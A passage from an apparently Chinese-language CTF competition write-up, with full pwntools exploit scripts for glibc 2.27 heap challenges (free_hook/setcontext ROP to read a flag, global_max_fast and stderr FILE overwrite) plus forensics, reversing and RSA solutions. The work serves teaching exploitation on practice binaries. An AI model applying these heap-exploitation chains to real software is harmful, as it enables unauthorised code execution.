= SigreturnFrame()</span><br><span class="line">frame.rsp = heap_base + 0x6f0</span><br><span class="line">frame.rdi = 0</span><br><span class="line">frame.rsi = heap_base + 0x6f0</span><br><span class="line">frame.rdx = 0x200</span><br><span class="line">frame.rip = libc.symbols[&quot;read&quot;] + libc_base</span><br><span class="line">orw = p64(pop_rdi_ret) + p64(3)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(0x2710)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(heap_base + 0x530)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(0)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(2)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(3)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base + 0x5b0)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(0x30) + p64(0)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(0)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(1)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base + 0x5b0)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(0x30) + p64(0)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(1)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">edit(11, bin((setcontext))[2:][::-1].ljust(64, &#x27;\x00&#x27;))</span><br><span class="line">bin_frame = convert(bytes(frame))</span><br><span class="line">add(12, 0x98)</span><br><span class="line">edit(12, bin_frame[0:0x98*8])</span><br><span class="line">add(15, 0x98)</span><br><span class="line">edit(15, bin_frame[0xa0*8:])</span><br><span class="line">delete(12)</span><br><span class="line">io.send(orw)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="bitheap">bitheap</span><a href="#bitheap" class="header-anchor"></a></h2><p>这道题和sandboxheap一样，而且还没有这道题的沙箱保护，用上道题的exp直接打就可以拿到flag<br>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process([&quot;./sandbox&quot;, &quot;./sandboxheap&quot;])</span></span><br><span class="line">io = remote(<span class="string">&quot;101.201.71.136&quot;</span>, <span class="number">44997</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bitheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">st</span>):</span><br><span class="line">    tar=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> st:</span><br><span class="line">        b=(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)[::-<span class="number">1</span>])</span><br><span class="line">        tar+=b</span><br><span class="line">    <span class="keyword">return</span> tar</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;1&#x27;</span> * <span class="number">0x80</span> * <span class="number">8</span> + <span class="string">b&#x27;00000100&#x27;</span> + \</span><br><span class="line">     <span class="string">b&#x27;10000000&#x27;</span> + <span class="string">b&#x27;00000000&#x27;</span> * <span class="number">6</span> + <span class="string">b&#x27;00000000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x88</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x110</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x110</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x110</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x010</span> -<span class="number">0x880</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;heap_base:\t&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>, <span class="built_in">bin</span>((free_hook))[<span class="number">2</span>:][::-<span class="number">1</span>].ljust(<span class="number">64</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x110</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x110</span>)</span><br><span class="line"></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">53</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x0000000000130514</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000001b500</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bin</span>(<span class="number">0x67616c662f2e</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,flag)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_base + <span class="number">0x6f0</span></span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = heap_base + <span class="number">0x6f0</span></span><br><span class="line">frame.rdx = <span class="number">0x200</span></span><br><span class="line">frame.rip = libc.symbols[<span class="string">&quot;read&quot;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi_ret) + p64(heap_base + <span class="number">0x530</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base + <span class="number">0x5b0</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base + <span class="number">0x5b0</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>, <span class="built_in">bin</span>((setcontext))[<span class="number">2</span>:][::-<span class="number">1</span>].ljust(<span class="number">64</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bin_frame = convert(<span class="built_in">bytes</span>(frame))</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x98</span>)</span><br><span class="line">edit(<span class="number">12</span>, bin_frame[<span class="number">0</span>:<span class="number">0x98</span>*<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x98</span>)</span><br><span class="line">edit(<span class="number">15</span>, bin_frame[<span class="number">0xa0</span>*<span class="number">8</span>:])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">io.send(orw)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2><span id="leak">leak</span><a href="#leak" class="header-anchor"></a></h2><p>flag被读到了一个堆块上，限制了申请堆块的个数，只能十六个，没有限制uaf的使用次数，可以改大Global_Max_Fast，造成fastbinY数组溢出，我们可以向write_base和write_ptr上写入堆地址，满足条件:write_ptr&gt;write_base即可，利用公式size&#x3D;((target_addr-(main_arena+8)&#x2F;8)*0x10+0x20)，就可以算出需要的size，最后exit，打印出flag即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./leak&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./leak&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x14b0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x14c0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x430</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0xa0</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, p16(<span class="number">0x9c30</span>))  <span class="comment"># tcache fd -&gt; unsorted bin chunk</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>, p16(<span class="number">0xf940</span>))  <span class="comment"># fd -&gt; global_max_fast</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0xdeadbee0</span>))  <span class="comment"># global_max_fast -&gt; 0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p16(<span class="number">0xe840</span>))  <span class="comment"># tcache fd -&gt; unsorted chunk</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, p16(<span class="number">0x9c30</span>))  <span class="comment"># fd-&gt; stderr</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0xa0</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0xa0</span>)  <span class="comment"># stderr</span></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xa0</span>)<span class="comment"># change stderr</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>, p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0x50</span>))</span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(14, 0x14d0)</span></span><br><span class="line"><span class="comment">#add(15, 0x500)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h1><h2><span id="strange-forensics">strange_forensics</span><a href="#strange-forensics" class="header-anchor"></a></h2><p>flag1是用户密码，直接搜root:<br>爆破出密码<br>$1$C5&#x2F;bIl1n$9l5plqPKK4DjjqpGHz46Y&#x2F;:890topico<br>flag3直接是明文<br><img src="../images/2022-xyb-SU-Writeup/9.png" alt="img"></p>
<p>stings发现里面有个secret.zip</p>
<p>用vol的插件提取linux_recover_filesystem，得制作一个同内核的profile，strings找到镜像系统Ubuntu18.04.5 5_4_0-84-generic<br>开一个虚拟机，apt安装好kernel，然后再vol的tools里生成profile并且打包好放进vol的插件里<br>测试可以用了以后就可以linux_recover_filesystem去<br>导出zip文件，打开是损坏的，010修复一下，修改一下加密位<br>爆破出密码为123456拿到flag2  _y0u_Ar3_tHe_LIn<br>最后拿到flag<br>flag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}</p>
<h1><span id="rev">Rev</span><a href="#rev" class="header-anchor"></a></h1><h2><span id="roket">roket</span><a href="#roket" class="header-anchor"></a></h2><p>测试输入数据和输出数据寻找规律发现是输入转ascii码然后三次方得到输出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="built_in">print</span>(gmpy2.iroot(<span class="number">7212272804013543391008421832457418223544765489764042171135982569211377620290274828526744558976950004052088838419495093523281490171119109149692343753662521483209758621522737222024221994157092624427343057143179489608942837157528031299236230089474932932551406181</span>, <span class="number">3</span>))</span><br><span class="line"><span class="comment">#6374667b746831735f69735f7265346c6c795f626561757431666c795f72316768743f7d</span></span><br><span class="line">a=<span class="string">&#x27;6374667b746831735f69735f7265346c6c795f626561757431666c795f72316768743f7d&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;0x&#x27;</span>+a[i]+a[i+<span class="number">1</span>],end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag:&#x27;</span>)</span><br><span class="line"><span class="comment">#0x63,0x74,0x66,0x7b,0x74,0x68,0x31,0x73,0x5f,0x69,0x73,0x5f,0x72,0x65,0x34,0x6c,0x6c,0x79,0x5f,0x62,0x65,0x61,0x75,0x74,0x31,0x66,0x6c,0x79,0x5f,0x72,0x31,0x67,0x68,0x74,0x3f,0x7d</span></span><br><span class="line">b=[<span class="number">0x63</span>,<span class="number">0x74</span>,<span class="number">0x66</span>,<span class="number">0x7b</span>,<span class="number">0x74</span>,<span class="number">0x68</span>,<span class="number">0x31</span>,<span class="number">0x73</span>,<span class="number">0x5f</span>,<span class="number">0x69</span>,<span class="number">0x73</span>,<span class="number">0x5f</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x34</span>,<span class="number">0x6c</span>,</span><br><span class="line"><span class="number">0x6c</span>,<span class="number">0x79</span>,<span class="number">0x5f</span>,<span class="number">0x62</span>,<span class="number">0x65</span>,<span class="number">0x61</span>,<span class="number">0x75</span>,<span class="number">0x74</span>,<span class="number">0x31</span>,<span class="number">0x66</span>,<span class="number">0x6c</span>,<span class="number">0x79</span>,<span class="number">0x5f</span>,<span class="number">0x72</span>,<span class="number">0x31</span>,<span class="number">0x67</span>,</span><br><span class="line"><span class="number">0x68</span>,<span class="number">0x74</span>,<span class="number">0x3f</span>,<span class="number">0x7d</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(b[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1><span id="crypto">crypto</span><a href="#crypto" class="header-anchor"></a></h1><h2><span id="little-little-fermat">little little fermat</span><a href="#little-little-fermat" class="header-anchor"></a></h2><p>题名提示了费马，并且分析p和q的生成过程可知，A相比于n是不算太大的；遂直接考虑费马分解n，得到p，q以后根据assert 114514 ** x % p &#x3D;&#x3D; 1可知x为p-1或p-1的整数倍，直接取x为p-1进行计算，异或就能得到flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393</span></span><br><span class="line">c = <span class="number">81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat</span>(<span class="params">num</span>):</span><br><span class="line">    x = iroot(num, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> x * x &lt; num:</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    <span class="comment"># y^2 = x^2 - num</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">        y2 = x * x - num</span><br><span class="line">        y = iroot(y2, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> y * y == y2:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    result = [<span class="built_in">int</span>(x + y), <span class="built_in">int</span>(x - y)]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">l = fermat(n)</span><br><span class="line">p = l[<span class="number">0</span>]</span><br><span class="line">q = l[<span class="number">1</span>]</span><br><span class="line">x = p-<span class="number">1</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">tmp = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(tmp^(x**<span class="number">2</span>)))</span><br></pre></td></tr></table></figure>
<h2><span id="tracing">tracing</span><a href="#tracing" class="header-anchor"></a></h2><p>题目自己实现了求公因数的算法gcd，主要是通过分支语句，加减法和移位操作来实现的；而trace.out文件则是类似于debug，打印了gcd算法整个过程的分支执行情况，所以我们只要用最后的a和b的值去反推整个算法，得到phi解密即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">c = <span class="number">64885875317556090558238994066256805052213864161514435285748891561779867972960805879348109302233463726130814478875296026610171472811894585459078460333131491392347346367422276701128380739598873156279173639691126814411752657279838804780550186863637510445720206103962994087507407296814662270605713097055799853102</span></span><br><span class="line">n = <span class="number">113793513490894881175568252406666081108916791207947545198428641792768110581083359318482355485724476407204679171578376741972958506284872470096498674038813765700336353715590069074081309886710425934960057225969468061891326946398492194812594219890553185043390915509200930203655022420444027841986189782168065174301</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;trace.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = f.read().split(<span 